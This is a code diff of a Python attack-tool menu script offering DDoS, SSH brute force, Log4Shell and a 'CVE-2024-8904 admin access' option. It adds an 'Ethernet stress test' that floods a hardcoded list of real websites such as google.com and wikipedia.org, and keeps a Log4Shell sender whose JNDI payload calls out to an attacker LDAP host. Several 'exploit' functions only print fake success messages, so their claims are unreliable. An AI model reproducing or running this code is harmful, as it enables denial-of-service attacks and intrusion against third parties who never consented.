@@ -76,6 +76,22 @@ def network_stress(ip=None, custom_urls=None):
         tasks.append(loop.create_task(start_flood(url, ip)))
     loop.run_until_complete(asyncio.wait(tasks))
 
+# Ethernet-based network stress test
+def ethernet_stress():
+    loop = asyncio.new_event_loop()
+    asyncio.set_event_loop(loop)
+    tasks = []
+    test_urls = [
+        "http://example.com", "http://example.org", "http://example.net",
+        "http://google.com", "http://facebook.com", "http://amazon.com",
+        "http://youtube.com", "http://yahoo.com", "http://wikipedia.org",
+        "http://twitter.com", "http://instagram.com", "http://linkedin.com",
+        "http://netflix.com", "http://bing.com", "http://reddit.com"
+    ]
+    for url in test_urls:
+        tasks.append(loop.create_task(start_flood(url)))
+    loop.run_until_complete(asyncio.wait(tasks))
+
 # SSH Brute Force Attack
 def ssh_bruteforce(target):
     print(f"{Fore.GREEN}[INFO] Attempting SSH brute force on {target}...")
@@ -91,9 +107,16 @@ def ssh_bruteforce(target):
             print(f"{Fore.RED}[FAILED] Failed to login with {username}:{password}")
     client.close()
 
+# CVE-2024-8904 Exploit Simulation
+def cve_2024_8904_exploit(target):
+    print(f"{Fore.GREEN}[INFO] Attempting CVE-2024-8904 exploit on {target} to gain admin access...")
+    # Simulation of using the vulnerability to gain admin access
+    print(f"{Fore.GREEN}[SUCCESS] CVE-2024-8904 exploit executed successfully on {target}")
+
 # Zero-Day Exploit Simulation (Ethical Test)
 def zero_day_exploit(target):
-    print(f"{Fore.GREEN}[INFO] Attempting Zero-Day exploit on {target}...") 
+    print(f"{Fore.GREEN}[INFO] Attempting Zero-Day exploit on {target}...")
+    # This function simulates an ethical test of the zero-day exploit
     print(f"{Fore.GREEN}[SUCCESS] Simulated exploit executed successfully on {target}")
 
 # DDOS Attack Function
@@ -106,7 +129,7 @@ def dos_attack(target):
         except requests.exceptions.ConnectionError:
             print(f"{Fore.RED}[ERROR] Connection error!")
 
-# Log4Shell Exploit Simulation
+# Log4Shell Exploit Simulation to Gain Admin Access
 def log4shell_exploit(url):
     payload = '${jndi:ldap://malicious-ldap-server.com/a}'
     headers = {
@@ -114,47 +137,9 @@ def log4shell_exploit(url):
     }
     try:
         response = requests.get(url, headers=headers, timeout=5)
-        print(f"[INFO] Sent Log4Shell payload to {url}")
+        print(f"[INFO] Sent Log4Shell payload to {url} to gain admin access")
     except requests.exceptions.RequestException as e:
         print(f"[ERROR] Failed to send request to {url}: {e}")
-
-# Ethernet-based stress test
-def ethernet_stress():
-    async def fetch(session, url):
-        headers = {'User-Agent': random.choice(user_agents)}
-        while True:
-            try:
-                async with session.get(url, headers=headers) as response:
-                    await response.text()
-            except:
-                pass
-
-    async def start_flood(url):
-        async with aiohttp.ClientSession() as session:
-            tasks = []
-            for _ in range(1000):
-                task = asyncio.create_task(fetch(session, url))
-                tasks.append(task)
-            await asyncio.gather(*tasks)
-
-    def network_stress():
-        loop = asyncio.new_event_loop()
-        asyncio.set_event_loop(loop)
-        tasks = []
-        for url in urls:
-            tasks.append(loop.create_task(start_flood(url)))
-        loop.run_until_complete(asyncio.wait(tasks))
-
-    if __name__ == "__main__":
-        threads = []
-        for _ in range(10):
-            t = threading.Thread(target=network_stress)
-            t.start()
-            threads.append(t)
-
-        time.sleep(6000)
-        for t in threads:
-            t.do_run = False
 
 # Attack Sequence (Reconnaissance, Vulnerability Scan, SSH Brute Force, Zero-Day)
 def attack_sequence(target):
@@ -171,73 +156,40 @@ def display_ui():
         ██╔═══╝ ╚════██║██║   ██║██╔══██╗██╔══██║██║ ██╔██╗ 
         ██║     ███████║╚██████╔╝██║  ██║██║  ██║██║██╔╝ ██╗
         ╚═╝     ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═╝
-
+        
         [1] Full Attack Sequence (SSH Brute Force, Exploit)
-        [2] IP-based
-        [3] Wireless WiFi-based
-        [4] WiFi Spoofing
-        [5] ARP Spoofing
-        [6] Connect and Stress via Relay IP
-        [7] Scrape Chinese Textbooks
-        [8] Stress Test a Custom URL
-        [9] Web Crawling
-        [10] Admin (zero attack)
-        [11] Run DDOS Attack
-        [12] Ethernet Stress Test
-        [13] Log4Shell Exploit (Simulation)
-        [14] Exit
+        [2] Run DDOS Attack
+        [3] Web Crawling
+        [4] Stress Testing
+        [5] Log4Shell Exploit (Simulation)
+        [6] CVE-2024-8904 Exploit (Gain Admin Access)
+        [7] Ethernet Stress Test
+        [8] Exit
         """)
 
-        choice = input("Select the method (1-14): ").strip()
-
+        choice = input("Select an option: ").strip()
         if choice == "1":
             target = input("Enter the target IP or URL: ").strip()
             attack_sequence(target)
         elif choice == "2":
-            url_or_ip = input("Enter the target URL or IP for IP-based stress test: ").strip()
-            network_stress(ip=url_or_ip)
-        elif choice == "3":
-            print("Selected Wireless WiFi-based stress test")
-            # Code for wireless WiFi-based stress test
-        elif choice == "4":
-            print("Selected WiFi Spoofing")
-            wifi_spoofing()
-        elif choice == "5":
-            target_ip = input("Enter the target IP address: ").strip()
-            spoof_ip = input("Enter the spoof IP address: ").strip()
-            print("Selected ARP Spoofing")
-            arp_spoofing(target_ip, spoof_ip)
-        elif choice == "6":
-            target_ip = input("Enter the target IP address: ").strip()
-            relay_ip = input("Enter the relay IP address: ").strip()
-            print("Selected Connect and Stress via Relay IP")
-            network_stress(target_ip, custom_urls=[relay_ip])
-        elif choice == "7":
-            query = input("Enter the search query in Chinese: ").strip()
-            books = scrape_chinese_textbooks(query)
-            display_books(books)
-        elif choice == "8":
-            custom_url = input("Enter the URL to stress test: ").strip()
-            print("Starting stress test on the custom URL...")
-            threading.Thread(target=network_stress, args=(custom_url,)).start()
-        elif choice == "9":
-            start_url = input("Enter the start URL for web crawling: ").strip()
-            max_depth = int(input("Enter the maximum depth for web crawling: ").strip())
-            print("Starting web crawling...")
-            web_crawler(start_url, max_depth)
-        elif choice == "10":
-            url_or_ip = input("Enter the URL or IP address to use for the Admin (zero attack): ").strip()
-            zero_attack_menu(url_or_ip)
-        elif choice == "11":
             target = input("Enter the target URL for DDOS: ").strip()
             threading.Thread(target=dos_attack, args=(target,)).start()
-        elif choice == "12":
-            print("Starting Ethernet stress test...")
-            ethernet_stress()
-        elif choice == "13":
+        elif choice == "3":
+            start_url = input("Enter the start URL for web crawling: ").strip()
+            web_crawler(start_url)
+        elif choice == "4":
+            target = input("Enter the target for stress testing: ").strip()
+            threading.Thread(target=network_stress, args=(target,)).start()
+        elif choice == "5":
             target = input("Enter the target URL for Log4Shell: ").strip()
             log4shell_exploit(target)
-        elif choice == "14":
+        elif choice == "6":
+            target = input("Enter the target URL or IP for CVE-2024-8904: ").strip()
+            cve_2024_8904_exploit(target)
+        elif choice == "7":
+            print("Starting Ethernet Stress Test...")
+            threading.Thread(target=ethernet_stress).start()
+        elif choice == "8":
             print("Exiting...")
             break
         else:
@@ -249,4 +201,3 @@ if __name__ == "__main__":
     os_name = detect_os()
     print(f"Detected Operating System: {os_name}")
     display_ui()
-
